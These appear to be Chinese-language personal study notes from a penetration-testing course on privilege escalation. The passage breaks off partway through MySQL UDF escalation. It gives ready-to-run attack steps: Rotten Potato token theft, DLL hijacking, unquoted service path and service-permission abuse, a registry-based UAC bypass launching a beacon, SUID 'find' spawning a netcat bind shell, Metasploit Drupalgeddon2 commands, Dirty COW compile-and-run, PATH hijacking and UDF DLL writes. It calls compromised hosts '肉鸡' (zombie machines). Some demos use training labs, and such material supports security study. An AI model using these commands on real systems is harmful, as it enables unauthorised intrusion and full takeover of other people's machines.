所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即**非服务类用户权限无法窃取成功。**

烂土豆比热土豆的优点是：  

- 1.100%可靠    
- 2.（当时）全版本通杀。  
- 3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。

**eg:**

目标是把web权限提到系统权限。首先以及成功在对方网站上传了大马，拿到了网站权限，通过执行命令whoami确定当前权限为iis apppool(常见基本的webshell级别的权限)，通过msf生成木马并通过webshell上传并执行到肉鸡上，同时msf进行监听，成功把webshell级别权限先转移到msf上。

然后尝试令牌窃取，但是由于拿到的权限不够，无法获取到system的令牌。（注意：如果先用令牌窃取失败，再尝试用烂土豆配合令牌窃取，可能会导致后者也失败，必须从头重新开始。所以最好直接使用烂土豆配合令牌窃取，不要测试这一步）

尝试用烂土豆配合令牌窃取提权：首先上传烂土豆到肉鸡上并在msf上切换到烂土豆的路径并执行烂土豆：

~~~cmd
execute -cH -f ./potato.exe
~~~

然后在重复令牌窃取命令，成功提取到system权限



-------





##### 5.进程注入-本地提权

###### 原理：

利用注入线程，从而窃取进程所有者的权限

这类技术主要利用在Windows2008之前操作系统

pinjector进程工具-针对win2008以前操作系统

pexec64 32进程注入工具-针对win2008及后以上操作系统(看运气)

##### 6.DLL劫持

###### DLL认知 

DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。

  DLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用。使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出。另外，使用DLL文件还可以减小程序的体积。

###### **原理**：

Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL或把正常的dll文件替换成恶意的dll文件来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：

- 1.应用程序加载的目录
- 2.C:\Windows\System32
- 3.C:\Windows\System
- 4.C:\Windows
- 5.当前工作目录Current Working Directory，CWD
- 6.在PATH环境变量的目录（先系统后用户）

**条件**：dll劫持提权需要特定软件应用的控制权限{可以删除或者覆盖其中的文件}及启用配合，复杂鸡肋，但是windows通杀

###### 演示案例：

首先已经成功给肉鸡上传了大马并且确定了存在第三方软件，在本地也下载一个该软件，然后通过工具HRSword-火绒剑对该软件的进程进行分析查看，看看非系统文件【如数字签名文件，系统文件没有system权限改不了】调用的dll文件路径，然后在msf生成dll后门文件，并通过webshell把该后门文件覆盖掉目标dll文件

(覆盖有多种方式，比如说可以直接替换，还可以把原来的文件改个名字，再把恶意dll文件改名成原来文件的名字)

然后再msf开启监听，并在服务器上运行第三方软件，成功监听，此时权限是admin[因为第三方软件启动时是被admin启动的]，此时权限满足令牌窃取，配合令牌窃取获得system权限

具体实现过程看上面链接

##### 7.不带引号的服务路径

###### 原理

当windows想要运行一个服务【服务一般是以system权限运行的】时，会在计算机寻找可执行文件的路径，一般每个服务的可执行文件对应路径可在windows-服务-属性中找到

eg:

![](https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210903123208471-1114642118.png)

可以看到不仅有引号内的路径，还有引号后面的参数

当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行（如图1）。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。

比如`"c:\Program Files\a.exe" -f`系统就会认为-f为参数，而要运行的文件路径为c:\Program Files\a.exe；但是如果是`c:\Program Files\a.exe -f`，没有引号告诉系统什么是路径，系统就会按空格划分，会认为Files\a.exe -f为参数，而要运行的文件路径为c:\Program

###### 过程：

1.检测引号服务路径（检测未被引号包含且还有空格的服务路径，看肉鸡的一些服务路径有没有没加引号这个问题）：

在肉鸡上执行命令

~~~CMD
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
~~~

爆出的服务名和服务路径即是没有带引号的服务，但是还得看路径有没有带空格

2.利用路径制作文件并上传

假如说爆出的空格路径为c:\Program Files\a.exe -f，那么当这个服务被执行时就会执行c:\Program，如果我们在该路径上传一个名为Program的木马【exe后缀无所谓】，那么当该服务启动时就会激活上传的木马

3.启用服务或重启

通过webshell启用服务或重启`sc start "服务名"`

但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。

调用后成功提权到system

##### 8不安全的服务权限配合MSF

适用于本地提权

###### 原理： 

假如我们拥有的用户权限可以操作某个服务，那么我们就可以把该服务的服务路径指向上传的提权程序，然后启用服务来运行提权后门程序

AccessChk下载：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

###### **过程**：

1.检测服务权限配置

使用命令：

~~~cmd
accesschk.exe -uwcqv "用户组名或用户名" *---检测该用户或用户组有什么可操作的服务命令
~~~

AccessChk为微软提供的第三方软件

2.制作文件并上传

3.更改服务路径指向

使用命令：

```cmd
sc config "NewServiceName【服务名】" binpath="C:\Program.exe【提权程序路径】"----把该服务的执行程序路径执行 提权+后门程序
```

4.调用后成功

监听会话，然后启用服务：

~~~cmd
sc start "NewServiceName"
~~~

##### 9.**AlwaysInstallElevated提权&Unattended Installs提权**

1、AlwaysInstallElevated是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。这个利用条件太苛刻，基本没法用，鸡肋。

参考：https://xz.aliyun.com/t/2519

2、Unattended Installs提权也不太好用，现实中没遇到过。

参考：https://www.cnblogs.com/zpchcbd/p/12232683.html

##### 	UAC提权

 UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。

  在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。
**UAC级别**

1.始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户
2.仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户
4.仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度
5.从不提示：当用户为系统管理员时，所有程序都会以最高权限运行
UAC默认是中等级别，一般UAC关闭的情况下使用getsystem就能够提权成功

条件：拿到管理员组的用户

###### 原理

UAC限制所有用户包括非RID500的管理员用户使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。这里所说的非RID500的用户是指除administrator以外、位于管理员组中的其他管理员用户，当非RID500的管理员用户登录后，系统会为其创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。标准用户访问令牌包含与管理员访问令牌相同的用户特定信息，只是移除了windows管理特权和相关SID。标准用户访问令牌用于启动不执行管理任务的应用程序（标准用户应用程序）。当管理员需要执行高权限管理任务时，windows会自动提示用户予以批准，同意后则允许使用管理员访问令牌。

有时候我们拿到了一个非administrator的管理员用户权限，其实非administrator的管理员权限还是有限，运行某些程序或执行某些操作时会弹出用户账户控制，如果点击否或者不点击就会出现拒绝访问，那么也就没有成功执行操作，所以要绕过uac。

###### 过程：

绕uac的方式：UAC白名单

微软在用户账户控制中为一些系统程序设置了白名单机制，所有白名单中的程序将不再询问，以静默方式自动提升到管理员权限不弹出UAC框，如slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe、rundll32.exe、explorer.exe等。攻击者可以对这些白名单程序进行dll劫持、dll注入或注册表劫持等，绕过uac并提升权限。
在寻找白名单程序时，可以使用微软工具sigcheck和Strings。

白名单程序拥有一个共同的特性，就是Manifest数据中autoElevate属性的值为True。

sigcheck可以检测程序是否具有autoElevate属性

以Computerdefaults.exe为例，该程序位于c:\windows\system32目录下

~~~cmd
sigcheck.exe /accepteula -m c:\windows\system32\Computerdefaults.exe
~~~

Strings可以找出所有具有autoElevate属性的程序

```bash
strings.exe /accepteula -s c:\windows\system32\*.exe | findstr /i "autoElevate"
```

eg:

下面以Computerdefaults.exe为例进行分析，并通过该程序绕过UAC进行提权。将其运行，会打开默认应用界面

从注册表里查询Shell\Open\command键值对

Monitor监控该程序发现，Computerdefaults.exe会先查询注册表HKCU\software\classes\ms-settings\shell\open\command中的数据，发现该路径不存在后会继续查询别的注册表。

通常，以“shell\open\command”命名的键值对存储的是可执行文件的路径，程序会读取其中的键值并运行可执行文件。由于Computerdefaults.exe是uac白名单中的程序，运行时默认提升了权限，因此在运行该键值中的可执行文件时默认为管理员权限。

所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。

普通用户执行以下命令：

~~~cmd
reg add "HKCU\software\classes\ms-settings\shell\open\command" /d "c:\beacon.exe" /f
reg add "HKCU\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "c:\beacon.exe" /f 
~~~

再次执行Computerdefaults.exe时，恶意程序就会随着Computerdefaults.exe的启动默认通过UAC控制并以提升的权限运行

### *linux

![](https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210909135557690-2136273391.png)

- 一样需要区分环境

#### 信息收集

[63：权限提升-Linux脏牛内核漏洞&SUID&信息收集 - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15223606.html)

对linux的信息收集，许多信息都可以通过对linux的一些操作命令即可获取

如果有特定的信息需求，可以去查看linux提权手法总结里信息收集部分的命令汇总，然后手工输入命令进行收集

但是一般来说进行linux信息收集都是通过自动化脚本或工具探针进行的

##### linux提权自动化脚本利用-4个脚本

**两个信息收集**

**LinEnum**

需要先把LinEnum.sh可执行文件上传到肉鸡,推荐`/tmp`目录【tmp为临时文件存放目录，在服务器重启后会清空，一般用户对该目录都是可读写的，所以tmp一般为优先上传目录】

- 假如上传了LinEnum.sh文件但是无法执行，就需要复制可执行权限给该文件，具体命令如下：

~~~cmd
chmod +x LinEnum.sh
~~~

**linuxprivchecker**

需要先把linuxprivchecker.py脚本上传到肉鸡(需要肉鸡支持python环境)然后运行



**两个漏洞探针**

这里的两个漏洞探针类似于windows的溢出漏洞的工具，用于检测系统可能存在的漏洞

linux-exploit-suggester

上传并运行linux-exploit-suggester.sh可执行文件,同样需要注意用chomd命令增加可执行权限

- 存在误报

linux-exploit-suggester2

linux-exploit-suggester-2.pl（需要肉鸡支持perl解释器环境，没有就得想办法安装，不然这个运行不了）















#### linux的提权方法有哪些

##### 1.SUID提权

###### 原理：

SUID是一种特殊的文件权限，作用：让普通用户临时拥有该文件的属主的执行权限，suid权限只能应用在二进制可执行文件（命令）上，而且suid权限只能设置在属主位置上，假设我们以非 root 用户身份访问目标系统，并且我们发现启用了 suid 位的二进制文件，那么这些文件/程序/命令可以以 root 权限运行。

###### suid认知：

suid权限使用s表示，增加权限u+s，移除权限u-s；
suid权限也可以使用数字形式表示，0表示去除suid权限，4表示添加suid权限，而且是在原权限的数字表达形式开头加0或4，如：0755移除suid权限，4755添加suid权限。

`例如：普通用户执行执行passwd命令时需要去修改/etc/shaow等文件，但ll /etc/shaow发现该文件没有任何权限，即普通用户对/etc/shaow文件是没有写入权限的，所以普通用户是怎么实现成功修改自己的密码的呢？答案是临时拥有了root权限（root超级管理员可以对任何文件进行修改）来实现密码的修改，suid权限只能应用在二进制可执行文件上。`

`chmod u+x 文件名 给予该文件SUID权限`

`chmod u-x 文件名 删除该文件SUID权限`

[Linux中文件特殊权限suid、sgid、sticky（有图详细讲解）-CSDN博客](https://blog.csdn.net/MssGuo/article/details/120754324)

提权原理：赋予文件Suid权限后，即使是普通用户调用该文件，也是以root权限执行该文件

```cmd
#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \


find / -perm -u=s -type f 2>/dev/null
参数：
	/表示从文件系统的顶部（根）开始，查找每个目录
	-perm表示搜索后面的权限
	-u=s表示查找 root 用户拥有的文件
	-type表示我们正在寻找的文件类型
	f 表示普通文件，而不是目录或特殊文件
	2表示到进程的第二个文件描述符，即 stderr（标准错误）
	>表示重定向
	/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容。

```

输入以上命令后，或者运行自动化信息收集脚本然后查看SUID权限的文件有哪些

查看返回结果中是否有以下程序：`nmap，vim，find，bash，more，less，nano，cp`。如果有某个，就可以利用该程序进行SUID提权

~~~
常用指令提权方法
https://blog.csdn.net/CoreNote/article/details/122093180
~~~

###### 不同程序对应的SUID提权方式不同，

具体参考下列文章：

https://pentestlab.blog/2017/09/25/suid-executables/

（以find为例子，这里的find指的就是linux自带的find命令所依赖的find程序，当我们使用find命令时实际上就是调用运行find程序，其文件完整路径应该为/usr/bin/find，如果我们输入以上命令后有返回/usr/bin/find就说明可以尝试进行SUID提权）

提权过程：探针是否有SUID（手工或脚本）-特定SUID利用-利用成功-GG



###### WEB环境下Linux提权SUID配合脚本演示-Aliyun

一个阿里云服务器已经搭好了WEB环境，并且已经被上传了webshell(小马)拿到了网站权限，使用冰蝎连接后门（冰蝎支持命令执行，反弹shell，内网穿透等功能），通过冰蝎进行反弹shell反弹到MSF上，然后把信息收集脚本LinEnum.sh通过MSF或者冰蝎上传到网站目录，然后给文件增加执行权限后运行，查看存在哪些有SUID权限的文件

找到了/usr/bin/find文件，然后根据find文件的对应SUID提权方式进行提权,执行命令：

```cmd
touch pentestlab
```

```cmd
find pentestlab -exec whoami \;
```

```cmd
find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
```















##### 2.内核漏洞提权

###### 原理：

不懂，内存那块的东西

###### 过程：

1.连接：先获取权限连接到肉鸡

2.获取可利用漏洞：上传自动化信息收集探针并运行，获取到肉鸡上可能存在的漏洞

3.下载并上传exp：假如存在一个漏洞是内核漏洞，去搜寻该特定内核漏洞相关的EXP和提权程序

4.编译exp：

有的exp要求下载运行某种提权程序到肉鸡上，可以先下载到本地再传上去，也可以在肉鸡上通过命令执行直接下载。

内核漏洞往往提权程序是一个c语言的文件，即后缀名为.C的文件，想要使用该程序需要先进行编译，把文件上传完后通过命令进行编译即可

5.给权限执行：chmod +x 文件名 然后执行

###### 本地环境下Mozhe靶场Linux配合内核漏洞进行提权

首先在Mozhe靶场中有一道题目为Ubuntu 16.04漏洞复现(CVE-2017-16995),启动靶场环境会给肉鸡的ip地址和肉鸡的一个普通用户账户密码，通过Xshell以普通用户权限远程SSH协议连接到了肉鸡

首先通过Xshell自带功能Xftp给肉鸡上传自动化信息收集探针文件(第一时间肯定考虑/tmp目录)并通过普通用户权限运行，输出的结果中显示肉鸡可能存在CVE-2017-16995漏洞

去工具中推荐的网站或者自己搜寻CVE-2017-16995漏洞的EXP，然后根据exp进行提权，给肉鸡上上传了提权文件45010.c

```cmd
gcc 45010.c -o 45010     ------编译45010.c文件并保存成45010程序
```

```cmd
chmod +x 45010          ------给45010程序增加运行权限
```

```cmd
./45010                 ------运行45010程序
```

~~~cmd
id                       ------检测是否提权成功
~~~

[Linux 系统管理 : id 命令详解_linux id输出的含义-CSDN博客](https://blog.csdn.net/yexiangCSDN/article/details/80736019)

###### WEB环境下Vulhub+阿里云靶场脏牛内核Linux提权

过程：

1.vulnhub靶机:启动vulnhub虚拟机靶机

2.探针目标：先通过探针找到靶机上的可攻击目标（比如用nmap扫描网段找ip,再扫ip的端口服务）

3.CMS漏洞利用：靶机通常有搭建网站，而网站一般是采用了开源的CMS搭建，可以利用CMS的漏洞，找到攻击面后通过攻击获取到WEB权限（比如通过nmap扫出来的WEB服务进行攻击获取webshell级别权限）

4.脚本探针提权漏洞：

5.利用内核提权

-------

先打开vulnhub虚拟机当靶机，再开一台kali充当攻击机，首先

在kail上执行命令ifconfig确定攻击机的ip地址为192.168.76.132，也就是说本地网段就是192.168.76.0上面，用kail的nmap扫本地网段找存活主机，即执行命令`nmap 192.168.76.0/24`，找到靶机的ip地址192.168.76.141(这里靶机是不能执行任何命令的，无法通过ifconfig查看靶机ip地址)

发现了目标ip地址以及开放了80端口，通过浏览器访问192.168.76.141:80，然后发现这里不是一个网站，即不是攻击面，暂时放弃80端口，然后继续用nmap扫肉鸡ip的所有端口，即执行命令`namp -p1- 65535 192.168.76.141`,又扫到了1898端口，通过浏览器连接192.168.76.141:1898,发现了一个WEB网站，下方有标明CMS采用了Drupal

去网上搜索Drupal漏洞进行利用获取webshell，或者在kail上打开msf，通过msf搜寻Drupal的相关漏洞，演示命令如下：

~~~cmd
msfconsole                                     ---打开工具MSF
search drupal                                  ---搜索关键字drupal,发现了不少利用exp，选取最新时间的一个
use exploit/unix/webapp/drupalgeddon2          ---使用其中的一个漏洞
show options                                   ---查看该漏洞需要设置哪些参数
set rhosts 192.168.76.141                      ---设置目标ip参数
set rport 1898                                 ---设置目标端口参数
explot                                         ---执行
~~~

执行命令后返回利用成功，并已经自动连接到msf上，可以直接执行命令getuid验证是否获取到了网站权限

通过msf给肉鸡上传并运行自动化信息收集脚本探针（以linux-exploit-suggester.sh为例，它在kail攻击机上的储存目录是/root/inux-exploit-suggester.sh)演示命令如下：

~~~cmd
upload /root/inux-exploit-suggester.sh /tmp/1.sh                 
#把msf工具所在主机目录/root/inux-exploit-uggester.sh中的文件上传到肉鸡目录的/tmp/1.sh中#
shell                                    
#打开shell会话，shell会话使用单纯的linux命令， 之前都是相当于用的是msf的命令
cd /tmp
#切换到探针目录
chmod +x 1.sh
# 赋予探针运行权限
./1.sh
#运行探针
~~~

然后爆出了一个漏洞：CVE-2016-5195 dirtycow(这个就是linux提权的脏牛漏洞，可以借助webshell权限进行提权)

同时给出了该漏洞利用exp的下载地址

`https://www.exploit-db.com/download/40611`

【这里可以自己去网上找exp进行提权，比如网址:`https://github.com/gbonacini/CVE-2016-5195`

也可以就直接通过msf的shell会话直接在linux肉鸡上下载提权程序，下面演示的就是】

执行命令：

~~~ cmd
wget https://www.exploit-db.com/download/40611
# 下载漏洞exp，这里msf工具有个问题，下载完提权程序后会直接把在本地保存的文件命名为40611，还需要自己去加个特定后缀，不同漏洞利用的exp后缀名不同，这里是.cpp
# 小迪推荐的就是直接自己去网上找exp下载，然后在上传给kail攻击机，再通过msf上传给肉鸡
~~~

上面那个命令忽略不计，小迪实际上演示的是自己上传的程序，在kail攻击机的/root/dcow.cpp目录，执行命令：

~~~cmd
upload /root/dcow.cpp /tmp/40847.cpp
# 把kail攻击机的提权程序上传到肉鸡的/tmp/40847.cpp目录
g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow 40837.cpp -lutil
# 对40847.cpp进行编译，编译成dcow程序，这条命令来自于EXP利用文章中
python -c 'import pty;pyt.spawn("/bin/bash")'
# 开启一个模拟终端，，该漏洞利用时必须要把shell变成交互式，具体原因涉及到漏洞的成因
./dcow 
# 运行
~~~

成功执行上述提权后，会复制一个root权限用户并告诉你账户密码（账户：root,密码：dirtyCowFun)

###### 脏牛漏洞原理

[Dirty COW漏洞原理与简单利用_dirtycow-CSDN博客](https://blog.csdn.net/hbhgyu/article/details/106245182)

跑内存上去了，不懂，暂时不学



##### 3.环境变量劫持提权

###### 原理：

环境变量劫持提权的条件是肉鸡上系统中存在带有suid的文件，且这个 文件中必须有系统命令，比如存在一个shell文件，代码如下

~~~
#include
void main() {
setuid(0);
setgid(0);
system("ps");
}
//setuid 规定了其运行用户，这个文件编译后被执行时会执行系统命令ps
~~~

此文件具有suid权限，普通用户可以以root权限运行该文件，而运行该文件又会执行命令ps，环境变量劫持提权的攻击面就在于劫持此时这里这个命令的环境变量

linux环境变量path存储着linux命令的可执行文件的路径，通过PATH变量来响应用户执行的命令。如果普通用户在环境变量中新增一个ps文件的路径，如

复制文件

eg:`cp /bin/sh /tmp/ps`---把sh命令的可执行文件复制成tmp目录下的ps（那么tmp目录下的ps命令执行后效果就是sh命令执行的效果）

增加环境变量

eg:`export path=/tmp:$PATH`(给环境变量增加一个路径/tmp)，

此时再直接执行ps命令，环境变量会优先去新加的/tmp目录寻找名为ps的可执行文件，最后就会造成执行sh命令的效果

此时执行shell就会执行命令ps，而ps环境变量又被劫持成了sh，所以最后就会执行命令sh。由于shell文件是sudi权限，那么就可以以root权限执行命令sh，也就是提权成功

[LINUX提权之环境变量提权篇 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/598231396)

常见攻击思路：

[在Linux中使用环境变量进行提权 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/173903.html)

###### 过程

1.手写调用文件

可以自己写一个文件，里面是进行提权的命令和操作

先自己写一段demo

2.编译并赋予suid权限：

`gcc demo.c -o shell`

`chmodu+s shell`

把demo.c文件进行编译，编译成名为shell的可执行文件,并赋予shell文件suid权限

------

第一二步还可以换成执行寻找目标服务器上具有suid且存在可利用命令的文件

总之，一二步的目的就是寻找在suid权限文件中要被执行的的可被劫持环境变量的命令

3.伪造该命令执行路径

eg:

复制法：比如目标是shell文件下的ps命令

shell文件源码如下：

#include
void main() {
setuid(0);
setgid(0);
system("ps");
}

`cp /bin/sh /tmp/ps`---把sh命令的可执行文件复制成tmp目录下的ps（那么tmp目录下的ps命令执行后效果就是sh命令执行的效果，也就是在/tmp目录下伪造了新的ps命令）

4.增加环境变量，加上伪造的命令执行路径，劫持该命令

eg:`export path=/tmp:$PATH`(给环境变量增加一个路径/tmp)，此时再直接执行ps命令，环境变量会优先去新加的/tmp目录寻找名为ps的可执行文件,也就是去执行我们伪造的ps命令，最后就会造成执行sh命令的效果

5.执行触发并提权

eg:执行命令`./shell`

此时执行shell就会执行命令ps，而ps环境变量又被劫持成了sh，所以最后就会执行命令sh。由于shell文件是sudi权限，



##### 4.计划任务(定时任务)



##### 5.第三方服务



## - 其他权限

### 脚本提权

自己总结的，拿到webshell就可以去网上搜一下提权脚本然后上传到网站上进行提权

### 数据库提权

数据库提权的前提是首先拿到数据库的最高权限，是通过数据库获取到主机的权限，而不是进行数据库本身权限的提权

数据库的提权不用区分环境是WEB还是本地，只要获取到数据库最高权限的账户密码，都可以尝试进行数据库提权。数据库提权最终目的是提到系统权限，只不过是因为漏洞方向利用不了，就从数据库下手

在系统溢出漏洞利用无果的情况下，可以尝试进行数据库提权

前提：目标服务器开启了数据库服务；获取到数据库最高权限用户的账户密码

- Access数据库是没有提权方法的

流程：

1，服务探针(通过端口，服务，其他来确定数据库种类)

2，信息收集(确定了数据库种类后根据数据库的特性来选择收集数据库最高权限账户密码的方式)

3，提权利用（拿到了最高权限账户密码后就可以根据数据库的种类选取提权方式进行提权）

4，获取权限



![](https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210902093613821-1008429013.png)

#### 必备知识

##### 常见不同数据库默认开启的端口号

[常见的数据库，默认端口号是多少？_数据库的端口-CSDN博客](https://blog.csdn.net/SeniorShen/article/details/108643979)

#### 探针

通过扫描端口，服务和一些其他（比如浏览一些文件和文件夹）来确定目标是否安装了数据库

#### 收集

通过查看配置文件，数据库的储存文件，暴力破解或者其他方式来得到数据库的最高权限账户密码

###### 配置文件

根据网站数据库的不同，找目录中的一些敏感关键字，然后配合webshell去找配置文件并进行读取来获取最高权限的账户密码

常见的有：sql,data,inc,config,conn,database,common,include等

- 了解常见数据库目录的命名规则和查找技巧

###### 储存/备份文件

根据数据库的特性来搜集到特殊数据库的特定储存/备份文件目录地址，并通过webshell去读取内容

- 配置文件和储存/备份文件不同，但是两者都有储存账户密码等敏感信息

eg:mysql的账户密码储存在mysql数据库中mysql库中的use表，而数据库的结构对应着文件的目录结构，即账户密码就储存在就在网站目录-MYSQL-data-mysql-user.MYD文件中

- 需要注意是数据库中的密码通常都是通过MD5加密的

- 了解不同数据库的储存格式，储存结构及对应内容

###### 暴力破解

远程暴力破解【（了解数据库是否支持外联以及如何开启外联），暴力破解工具在自己客户端，想要去暴力破解人家的数据库，就需要人家数据库支持外联,但是root账户一般不支持外联，就需要用到脚本暴力破解】

利用脚本暴力猜解（通过webshell把脚本代码上传到服务器网站上，然后再进行爆破，用对方服务器去运行脚本，这样就相当于远程进行本地暴力破解）

#### 分类

确定目标数据库的种类后，根据不同的数据库采取不同的提权方式

##### Mysql

###### UDF

[Mysql之UDF提权-CSDN博客](https://blog.csdn.net/qq_44159028/article/details/121193134?ops_request_misc=%7B%22request%5Fid%22%3A%22171265476016800178574049%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171265476016800178574049&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121193134-null-null.142^v100^control&utm_term=udf数据库提权&spm=1018.2226.3001.4187)

UDF全名为用户自定义函数，是mysql的一个扩展接口，攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，创建一个指向udf.dll的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令。不同的操作系统，不同的版本，提权时导出udf.dll存放的目录不一样。

原理：

1.首先DLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用。

2.攻击者通过编写的是调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，创建一个指向udf.dll的自定义函数，从而在数据库中的查询就等价于在cmd或者shell中执行命令

也就是说，mysql支持自定义函数，那攻击者自定义了一个函数去执行命令，内容中有写到要求被使用时要调用udf.dll文件，然后攻击者再自己编写一个调用cmd或者shell的udf.dll文件并上传到插件目录【因为是自己写进去的，随着mysql数据库版本提升，这种外来文件只能存到插件目录中】，这样攻击者在mysql数据库中使用自定义函数就会相当于在cmd或者shell中执行命令

[DLL文件是什么？有几种调用方式？-CSDN博客](https://blog.csdn.net/will130/article/details/49680999?ops_request_misc=&request_id=&biz_id=102&utm_term=dll是什么文件&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-49680999.142^v100^control&spm=1018.2226.3001.4187)

条件：

1.获取到数据库最高权限账户密码且可以连接到数据库

2.mysql数据库具有写入文件权限，即secure_file_priv的值为空（null != 空）

- UDF提权是基于MYSQL调用命令执行函数来进行提权的，mysql提权获取到的权限大小跟运行mysql所在服务器登录的账号的权限相关，如操作系统以普通用户登录的并启动mysql，经udf提权后也只能获取到系统的普通用户权限。而使用管理员登录操作系统运行mysql，提权后获取的权限则为系统管理员权限。

**第一步：查看mysql是否有写入文件的权限**

![](https://img-blog.csdnimg.cn/img_convert/725dd703e3675a6dda114b0eb8fc430b.png)

如果secure_file_priv的值不是这个，可以在mysql/my.ini目录下查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = ' ' ，然后重启apache服务。

**第二步：判断Mysql数据库，操作系统版本**

输入账户密码登录mysql数据库，执行命令

`select version()`---获取数据库版本

cmd执行`systeminfo`---获取操作系统版本

`select @@basedir;`----查看数据库的安装目录

- 第三，四步如果你是上传的是一个大马websehll【即本身webshell就是一个工具】或者通过webshell再上传一个提权脚本且支持udf提权，往往就可以省略手工操作

**第三步：上传UDF 的动态链接库文件**

给目标网站数据库的目录上传udf.dll文件，这个文件可以从sqlmap和msf中找到，注意区分udf.dll适用的版本是linux还是windows，是32位还是64位

- `select @@version_compile_os, @@version_compile_machine;`---获取当前数据库及操作系统的架构情况
- sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名为`.so_`或`.dll_`的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在/extra/cloak目录下，使用cloak.py解密即可。
- mysql数据库运行过程中.dll文件是不可以被删除的

具体看上面那篇udf提权文章

Mysql版本大于5.1：udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建，创建时可以使用ntfs【windows文件系统】的ADS【NTFS交换数据流】创建或者用webshell大马工具创建）。 

[mysql利用ntfs的ADS创建文件夹 - 极客分享 (geek-share.com)](https://www.geek-share.com/detail/2597415862.html)

[NTFS数据流隐写_ntfs隐写-CSDN博客](https://blog.csdn.net/qq_45836474/article/details/111074356)

[Windows系统 notepad命令详解，Windows系统打开记事本_windows notepad-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/121248261)

Mysql版本小于5.1：

如果是 win 2000 的服务器，我们则需要将 udf.dll 文件写在C:\Winnt\udf.dll 下。
如果是 win2003 服务器，我们则要将 udf.dll 文件写在 C:\Windows\udf.dll 下。

通过如下命令将dll文件写入到plugin的udf.dll文件中

~~~
select hex(load_file('D:\\02-Hacking_Tools\\02-vuln-exploit\\sqlmap\\extra\\cloak\\lib_mysqludf_sys.dll')) into dumpfile 'E:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';
#ps：这里windows下目录结构要进行转义双写
~~~

有时候这一步的写入步骤只会写入一部分的内容，导致接下来的步骤都失败，所以也可以直接写入十六进制数据，详细看上面那篇udf提权文章

